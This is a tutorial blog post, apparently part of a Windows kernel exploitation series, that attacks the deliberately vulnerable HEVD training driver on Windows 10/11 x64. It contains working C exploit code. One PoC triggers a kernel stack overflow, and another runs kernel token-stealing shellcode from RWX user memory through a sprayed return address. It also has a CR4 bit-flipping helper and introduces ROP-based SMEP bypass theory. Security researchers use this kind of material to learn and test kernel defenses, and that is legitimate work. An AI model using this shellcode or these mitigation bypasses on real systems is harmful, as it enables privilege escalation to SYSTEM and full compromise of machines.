      <div class="mb-5"></div>
      

    

  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
    

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="article-content max-w-prose mb-20">
          <p>This post was made possible through hard work and determination. Do not feel frustrated if this stuff does not click immediately and remember, the source of truth will always be the source code. For us, our source code is raw assembly. That said it’s important you understand these techniques in detail because when Microsoft releases new mitigations your foundation is what will allow you to develop bypasses. So, if something is not clear take your time and step through it in the debugger.</p>
<p>In the <a href="https://wetw0rk.github.io/posts/0x00-introduction-to-windows-kernel-exploitation/" target="_blank">last post</a> you should have obtained a solid understanding of the basics of Windows Kernel Exploitation. We will now be jumping off the deep end and exploiting Windows 10 (x64) and Windows 11 (x64). Within this post you will be getting an introduction to some of the latest exploit mitigations offered by Microsoft and how &ldquo;easily&rdquo; they can be bypassed. That said only SOME will be covered, more exist but we will only cover them when relevant within this series.</p>
<p>In addition, this post will include the release of my PoC ROP chain - <em>Violet Phosphorus</em>, a universal VBS/SMEP bypass technique.</p>
<p>To prove its effectiveness, I went ahead deployed <em>Violet Phosphorus</em> against Windows 11 24H2 just for this post. If I understand correctly this is the latest version of Windows 11 which was released October 1st, 2024.</p>
<pre tabindex="0"><code>DISCLAIMER: TO BE CLEAR THIS DOES NOT BYPASS HVCI, AT THE TIME OF WRITING I BELIEVED THIS TO BYPASS HVCI. THIS POST ONLY CONTAINS A SMEP BYPASS. ADDITIONALLY EXPLOITS IN THIS SERIES WERE TESTED PRIMARILY ON: WINDOWS 11 (x64) - 10.0.22000 N/A Build 22000
</code></pre>

<h1 class="relative group">Table of Contents 
    <div id="table-of-contents" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#table-of-contents" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li><a href="#entering-the-modern-landscape">Entering the Modern Landscape</a>
<ul>
<li><a href="#bypassing-smep-theory">Bypassing SMEP (Theory)</a>
<ul>
<li><a href="#finding--using-rop-gadgets">Finding &amp; Using ROP Gadgets</a></li>
<li><a href="#finding-the-kernel-base-address">Finding the Kernel Base Address</a></li>
</ul>
</li>
<li><a href="#bypassing-vbs-theory">Bypassing VBS (Theory)</a></li>
</ul>
</li>
<li><a href="#violet-phosphorus">Violet Phosphorus</a>
<ul>
<li><a href="#understanding-the-rop-chain">Understanding the ROP Chain</a></li>
</ul>
</li>
<li><a href="#crafting-a-poc">Crafting a PoC</a></li>
<li><a href="#exploitation-rip--tear">Exploitation (Rip &amp; Tear)</a></li>
<li><a href="#sources">Sources</a></li>
</ul>


<h1 class="relative group">Entering the Modern Landscape 
    <div id="entering-the-modern-landscape" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#entering-the-modern-landscape" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>Considering we exploited the Stack Overflow within <code>Windows 7 (x86)</code> and having gone in depth in regards to it&rsquo;s underlying operations. There was no need to re-hash the vulnerability, at least not for this type of bug. That said, we can go ahead and jump straight into exploit development for Windows 10 (x64).</p>
<p>As mentioned in the <a href="https://wetw0rk.github.io/posts/0x00-introduction-to-windows-kernel-exploitation/" target="_blank">last post</a> we will shift languages and use C rather than Python. If you&rsquo;re using Kali and want to follow along with me, install <em>mingw-w64</em> as this will be what I will be using to compile my exploit code. You can also use <a href="https://visualstudio.microsoft.com/" target="_blank">Visual Studio</a> it&rsquo;s all based on preference really.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install mingw-w64 -y
</span></span></code></pre></div><p>If you&rsquo;re still new to C, the following can also be accomplished in Python. I intentionally used it in the last post for those who want to jump in without using C. However, you will see that the further you get into exploit development knowledge of C is not optional. That said let&rsquo;s look at our initial PoC code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define BUFFER_SIZE 4242
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hHEVD</span>                <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">bytesReturned</span>         <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span>    <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Getting a handle on HEVD</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">hHEVD</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="p">(</span><span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                        <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hHEVD</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Generating evil buffer...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Triggering control code 0x222003</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hHEVD</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="mh">0x222003</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">buffer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">BUFFER_SIZE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We can compile it using a cross compiler from mingw from within Linux (<em>x86_64-w64-mingw32-gcc poc.c -o poc.exe</em>). Once sent, we can see that we have successfully achieved memory corruption :)</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/corruption.png" alt="alt text" />
      
    </figure>
</p>
<p>Let&rsquo;s update the PoC this time we&rsquo;ll include shellcode (Generated with <a href="https://github.com/wetw0rk/Sickle" target="_blank">Sickle</a>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define BUFFER_SIZE 4242
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hHEVD</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">lpMemory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">bytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">shellcodeLength</span> <span class="o">=</span> <span class="mi">62</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int64_t</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span> <span class="c1">// movabs rax, qword ptr gs:[0x188]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8b\x80\xb8\x00\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov rax, qword ptr [rax + 0xb8]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x89\xc1</span><span class="s">&#34;</span>                                 <span class="c1">// mov rcx, rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xb2\x04</span><span class="s">&#34;</span>                                     <span class="c1">// mov dl, 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8b\x80\x48\x04\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov rax, qword ptr [rax + 0x448]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x2d\x48\x04\x00\x00</span><span class="s">&#34;</span>                     <span class="c1">// sub rax, 0x448
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x38\x90\x40\x04\x00\x00</span><span class="s">&#34;</span>                     <span class="c1">// cmp byte ptr [rax + 0x440], dl
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x75\xeb</span><span class="s">&#34;</span>                                     <span class="c1">// jne 0x1017
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8b\x90\xb8\x04\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov rdx, qword ptr [rax + 0x4b8]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x89\x91\xb8\x04\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov qword ptr [rcx + 0x4b8], rdx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="s">&#34;</span><span class="se">\x5d</span><span class="s">&#34;</span>          <span class="c1">// pop rbp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xc2\x08\x00</span><span class="s">&#34;</span><span class="p">;</span> <span class="c1">// ret 8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Getting a handle on HEVD</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">hHEVD</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="p">(</span><span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                        <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hHEVD</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Allocating RWX memory</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">lpMemory</span> <span class="o">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">shellcodeLength</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="p">(</span><span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                            <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Copying shellcode into RWX memory</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">lpMemory</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcodeLength</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Spraying return address: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">lpMemory</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">270</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* Spray the return address, who cares about accuracy ;) */</span>
</span></span><span class="line"><span class="cl">        <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">lpMemory</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Triggering control code 0x222003</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hHEVD</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="mh">0x222003</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">buffer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">BUFFER_SIZE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s try to allocate memory as we did before in <code>Windows 7 (x86)</code>. When we jump to it we get the following error:</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/attempt_failed_exec_userland_code.png" alt="alt text" />
      
    </figure>
</p>
<p>After a bit of research on the error we can confirm we’re dealing with <strong>SMEP (Supervisor Mode Execution Prevention)</strong> which is a memory protection built into modern Windows OS’s since Windows 8. Assuming you’re familiar with userland exploitation imagine this as DEP only the focus is preventing code execution within user-mode memory. This is oversimplifying it but for the sake of this tutorial we won’t dive any deeper. All we need to do is find a way to bypass it, that is our objective.</p>


<h2 class="relative group">Bypassing SMEP (Theory) 
    <div id="bypassing-smep-theory" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#bypassing-smep-theory" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>To bypass SMEP we’re likely going to need to deploy some ROP, just as we would if we encountered DEP in a user-mode context. If you’re familiar with Linux Kernel exploitation your brain might also go to SMAP. This is good since we’ll be dealing with bits. In short, SMEP is enabled by setting the 20th bit of the CR4 register. In theory, this can be modified by the Kernel, hence why ROP is an ideal technique to deploy.</p>
<p>Let&rsquo;s look at this in WinDbg.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/cr4.png" alt="alt text" />
      
    </figure>
</p>
<p>When flipping the bits of any number, we are in essence changing the value. To see what number we&rsquo;d need to place here be representative of flipping the 20th bit I wrote a simple C program to generate the number for me. The code to do this, can be seen below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* wetw0rk */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// https://stackoverflow.com/questions/111928/is-there-a-printf-converter-to-print-in-binary-format
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define PRINTF_BINARY_PATTERN_INT8 &#34;%c%c%c%c%c%c%c%c &#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PRINTF_BYTE_TO_BINARY_INT8(i)    \
</span></span></span><span class="line"><span class="cl"><span class="cp">    (((i) &amp; 0x80ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span class="line"><span class="cl"><span class="cp">    (((i) &amp; 0x40ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span class="line"><span class="cl"><span class="cp">    (((i) &amp; 0x20ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span class="line"><span class="cl"><span class="cp">    (((i) &amp; 0x10ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span class="line"><span class="cl"><span class="cp">    (((i) &amp; 0x08ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span class="line"><span class="cl"><span class="cp">    (((i) &amp; 0x04ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span class="line"><span class="cl"><span class="cp">    (((i) &amp; 0x02ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span class="line"><span class="cl"><span class="cp">    (((i) &amp; 0x01ll) ? &#39;1&#39; : &#39;0&#39;)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PRINTF_BINARY_PATTERN_INT16 \
</span></span></span><span class="line"><span class="cl"><span class="cp">    PRINTF_BINARY_PATTERN_INT8              PRINTF_BINARY_PATTERN_INT8
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PRINTF_BYTE_TO_BINARY_INT16(i) \
</span></span></span><span class="line"><span class="cl"><span class="cp">    PRINTF_BYTE_TO_BINARY_INT8((i) &gt;&gt; 8),   PRINTF_BYTE_TO_BINARY_INT8(i)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PRINTF_BINARY_PATTERN_INT32 \
</span></span></span><span class="line"><span class="cl"><span class="cp">    PRINTF_BINARY_PATTERN_INT16             PRINTF_BINARY_PATTERN_INT16
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PRINTF_BYTE_TO_BINARY_INT32(i) \
</span></span></span><span class="line"><span class="cl"><span class="cp">    PRINTF_BYTE_TO_BINARY_INT16((i) &gt;&gt; 16), PRINTF_BYTE_TO_BINARY_INT16(i)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PRINTF_BINARY_PATTERN_INT64    \
</span></span></span><span class="line"><span class="cl"><span class="cp">    PRINTF_BINARY_PATTERN_INT32             PRINTF_BINARY_PATTERN_INT32
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PRINTF_BYTE_TO_BINARY_INT64(i) \
</span></span></span><span class="line"><span class="cl"><span class="cp">    PRINTF_BYTE_TO_BINARY_INT32((i) &gt;&gt; 32), PRINTF_BYTE_TO_BINARY_INT32(i)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * flip_bit: simple function to flip a bit, for CR4 this would be 20
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">flip_bit</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">cr4</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bit_position</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mask</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">bit_position</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="n">cr4</span> <span class="o">^</span> <span class="n">mask</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Usage: %s &lt;current cr4 value&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">num</span> <span class="o">=</span> <span class="nf">strtoll</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;OLD CR4:</span><span class="se">\n\n\t</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">PRINTF_BINARY_PATTERN_INT64</span><span class="p">,</span> <span class="nf">PRINTF_BYTE_TO_BINARY_INT64</span><span class="p">(</span><span class="n">num</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">num</span> <span class="o">=</span> <span class="nf">flip_bit</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;NEW CR4</span><span class="se">\n\n\t</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">PRINTF_BINARY_PATTERN_INT64</span><span class="p">,</span> <span class="nf">PRINTF_BYTE_TO_BINARY_INT64</span><span class="p">(</span><span class="n">num</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Result: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">num</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s run it.</p>
<pre tabindex="0"><code>$ ./get_cr4 0x0000000000b50ef8
OLD CR4:

        00000000 00000000 00000000 00000000 00000000 10110101 00001110 11111000 
NEW CR4

        00000000 00000000 00000000 00000000 00000000 10111101 00001110 11111000 

Result: 0xbd0ef8
